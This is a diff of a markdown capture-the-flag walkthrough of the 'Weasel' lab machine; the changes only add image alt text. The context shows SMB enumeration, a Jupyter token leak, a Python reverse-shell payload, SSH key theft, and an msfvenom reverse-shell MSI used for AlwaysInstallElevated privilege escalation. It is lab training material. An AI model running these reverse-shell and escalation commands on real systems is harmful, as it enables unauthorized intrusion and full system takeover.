@@ -46,15 +46,15 @@ nmap -A -p- TARGET -Pn --min-rate 10000 -oN weasel.nmap
 | 49670    | msrpc       |
 | 49671    | msrpc       |
 
-![](https://cdn.ziomsec.com/weasel/1.webp)
+![performing an nmap scan on weasel machine](https://cdn.ziomsec.com/weasel/1.webp)
 
-![](https://cdn.ziomsec.com/weasel/2.webp)
+![performing an nmap scan on weasel machine](https://cdn.ziomsec.com/weasel/2.webp)
 
 ## Foothold
 
 The nmap scan revealed multiple services running like **ssh**, **rpc**, **smb**, **http**, **winrm** etc. I started enumeration with **http**. I accessed it on my browser and found a **Jupyter** notebook login page.
 
-![](https://cdn.ziomsec.com/weasel/3.webp)
+![accessing the jupyter login page](https://cdn.ziomsec.com/weasel/3.webp)
 
 I then looked for hidden directories using **ffuf** on the jupyter notebook page.
 
@@ -62,7 +62,7 @@ I then looked for hidden directories using **ffuf** on the jupyter notebook page
 ffuf -u http://TARGET:8888/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,302,301
 ```
 
-![](https://cdn.ziomsec.com/weasel/4.webp)
+![finding hidden directories using ffuf](https://cdn.ziomsec.com/weasel/4.webp)
 
 I found an *api* endpoint but found nothing interesting there. It just revealed the version: `6.0.3`.
 
@@ -72,7 +72,7 @@ I then enumerated **smb** and listed the shares on the target.
 smbclient -L TARGET
 ```
 
-![](https://cdn.ziomsec.com/weasel/5.webp)
+![listing smb shares](https://cdn.ziomsec.com/weasel/5.webp)
 
 There was an interesting share called *datasci-team*. I then used **smbclient** to connect to the share and found the jupyter token. I could use this token to log into the jupyter notebook. So I downloaded this token.
 
@@ -80,19 +80,19 @@ There was an interesting share called *datasci-team*. I then used **smbclient** 
 smbclient //TARGET/datasci-team -N
 ```
 
-![](https://cdn.ziomsec.com/weasel/6.webp)
+![connecting to an smb share](https://cdn.ziomsec.com/weasel/6.webp)
 
 I pasted the token and used it to set the password as **password**
 
-![](https://cdn.ziomsec.com/weasel/7.webp)
+![resetting the password](https://cdn.ziomsec.com/weasel/7.webp)
 
 I found a bunch of files. The *workbook* file seemed interesting so I opened it.
 
-![](https://cdn.ziomsec.com/weasel/8.webp)
+![inspecting the jupyter notebook](https://cdn.ziomsec.com/weasel/8.webp)
 
 I was allowed to run **python** code in this workbook.
 
-![](https://cdn.ziomsec.com/weasel/9.webp)
+![opening the workbook](https://cdn.ziomsec.com/weasel/9.webp)
 
 So I added a new code block and a simple **python** code to get a reverse shell.
 
@@ -113,7 +113,7 @@ s.connect((attacker_ip, attacker_port))
 pty.spawn("/bin/bash")
 ```
 
-![](https://cdn.ziomsec.com/weasel/10.webp)
+![adding a reverse shell payload](https://cdn.ziomsec.com/weasel/10.webp)
 
 I started a listener and executed the code to get a reverse shell from the target.
 
@@ -121,11 +121,11 @@ I started a listener and executed the code to get a reverse shell from the targe
 rlwrap nc -lvp 80
 ```
 
-![](https://cdn.ziomsec.com/weasel/11.webp)
+![getting a reverse shell](https://cdn.ziomsec.com/weasel/11.webp)
 
 I found an **ssh** private key of the *dev-datasci-lowpriv* user.
 
-![](https://cdn.ziomsec.com/weasel/12.webp)
+![finding the ssh private key of a user](https://cdn.ziomsec.com/weasel/12.webp)
 
 I saved this private key on my local system and used it to log in through **ssh**.
 
@@ -139,7 +139,7 @@ Finally, I got the user flag from *Desktop*.
 more C:\Users\dev-datasci-lowpriv\Desktop\user.txt
 ```
 
-![](https://cdn.ziomsec.com/weasel/13.webp)
+![capturing the usr flag](https://cdn.ziomsec.com/weasel/13.webp)
 
 ## Privilege Escalation
 
@@ -150,15 +150,15 @@ powershell -ep bypass
 .\PrivescCheck.ps1; Invoke-PrivescCheck
 ```
 
-![](https://cdn.ziomsec.com/weasel/14.webp)
+![enumerating misconfigurations](https://cdn.ziomsec.com/weasel/14.webp)
 
 It discovered and extracted the **winlogon** credentials.
 
-![](https://cdn.ziomsec.com/weasel/15.webp)
+![discovering logon credentials](https://cdn.ziomsec.com/weasel/15.webp)
 
 It then found a vulnerability that could be used to escalate our privilege.
 
-![](https://cdn.ziomsec.com/weasel/16.webp)
+![finding a misconfigured privilege](https://cdn.ziomsec.com/weasel/16.webp)
 
 I referred to the below article to use the **AlwaysinstallElevated** policy to get admin access : 
 - https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
@@ -169,11 +169,11 @@ Hence, I created a payload using **msfvenom**.
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=PORT -f msi -o exploit.msi
 ```
 
-![](https://cdn.ziomsec.com/weasel/17.webp)
+![creating a reverse shell payload with msfvenom](https://cdn.ziomsec.com/weasel/17.webp)
 
 I downloaded this payload on the system and started a **netcat** listener on my local machine.
 
-![](https://cdn.ziomsec.com/weasel/18.webp)
+![transferring the payload on the target](https://cdn.ziomsec.com/weasel/18.webp)
 
 I ran the payload with **msiexec** as *dev-datasci-lowpriv* user.
 
@@ -181,11 +181,11 @@ I ran the payload with **msiexec** as *dev-datasci-lowpriv* user.
 runas /u:dev-datasci-lowpriv "msiexec /qn /i C:\Users\dev-datasci-lowpriv\Desktop\exploit.msi"
 ```
 
-![](https://cdn.ziomsec.com/weasel/19.webp)
+![executing the payload](https://cdn.ziomsec.com/weasel/19.webp)
 
 Finally, I got a reverse shell as **NT authority system**.
 
-![](https://cdn.ziomsec.com/weasel/20.webp)
+![getting shell as SYSTEM](https://cdn.ziomsec.com/weasel/20.webp)
 
 I then captured the root flag from *Administrator*'s Desktop.
 
@@ -193,7 +193,7 @@ I then captured the root flag from *Administrator*'s Desktop.
 more C:\Users\Administrator\Desktop\root.txt
 ```
 
-![](https://cdn.ziomsec.com/weasel/21.webp)
+![capturing the root flag](https://cdn.ziomsec.com/weasel/21.webp)
 
 That's it from my side! Until next time :)
 
